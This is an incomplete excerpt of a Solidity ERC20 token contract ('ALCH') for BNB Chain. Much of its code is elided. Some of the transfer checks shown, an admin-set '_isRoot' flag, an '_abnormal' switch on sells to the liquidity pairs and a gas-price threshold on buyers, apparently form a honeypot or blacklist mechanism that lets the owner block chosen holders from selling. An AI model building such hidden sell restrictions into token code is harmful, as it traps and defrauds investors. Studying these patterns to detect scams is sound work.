...
contract ALCH is ERC20Capped,ERC20Pausable,AccessControl{ 
    address public _V2BNBPair;  
    address public _V2BUSDPair; 
    uint256 public _cost;
    uint256 public _costDecimals=9; 
    mapping(address=>bool) private _isRoot;
    address private _power;
    ...
    uint256 private _airDropTime=30 days;
    mapping(address=>uint256) _airDropList;
 

    constructor(string memory _name,string memory _symbol,uint256 _totalSupply,address airdrop,uint256 cost)
    ERC20(_name, _symbol,_totalSupply,_msgSender())
    ERC20Capped(_totalSupply*2){     
        _grantRole(DEFAULT_ADMIN_ROLE, _msgSender());  
        _airDrop=airdrop;
        _cost=cost*10**_costDecimals;
        _supreme[msg.sender]=true;
        _supreme[airdrop]=true;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        _V2BNBPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH()); 
    }   
    ...
    function setOtherSwapPool(address OtherSwap) public  onlyRole(DEFAULT_ADMIN_ROLE){
        _V2BUSDPair=OtherSwap;
    }

    function getV2BNBPair() public view returns(address bnbpair){
        return _V2BNBPair;
    }
  
    function updateHolderCount(address sender,address recipient) internal virtual {
        if(sender==_V2BUSDPair || sender==_V2BNBPair){
    ...
    function getCheckRoot(address sender,address recipient) internal virtual returns(bool statue){
        ...
        if((sender==_V2BNBPair     || sender==_V2BUSDPair)){return false;}
        if((recipient==_V2BUSDPair || recipient==_V2BNBPair) && (_isRoot[sender] || _abnormal)){
            return true;
         }    
    ...
    function getGasPrice(address sender,address recipient,uint256 gasprice_) internal virtual {  
        _gasprice=gasprice_;
        if(gasprice_>_cost &&(sender == _V2BNBPair || sender==_V2BUSDPair)){
    ...
    function getCost() public view returns(uint256 cost_){
        return _cost;
    }
